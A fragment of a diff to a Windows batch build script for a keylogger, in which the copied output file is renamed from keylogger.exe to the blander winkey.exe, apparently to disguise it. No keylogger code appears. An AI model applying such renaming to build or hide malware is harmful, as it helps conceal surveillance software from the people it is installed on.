@@ -10,7 +10,7 @@ if %ERRORLEVEL% NEQ 0 (
     echo Error: Failed to build keylogger.
     exit /b %ERRORLEVEL%
 )
-copy /Y keylogger.exe ..\
+copy /Y winkey.exe ..\
 cd ..
 
 echo ===========================
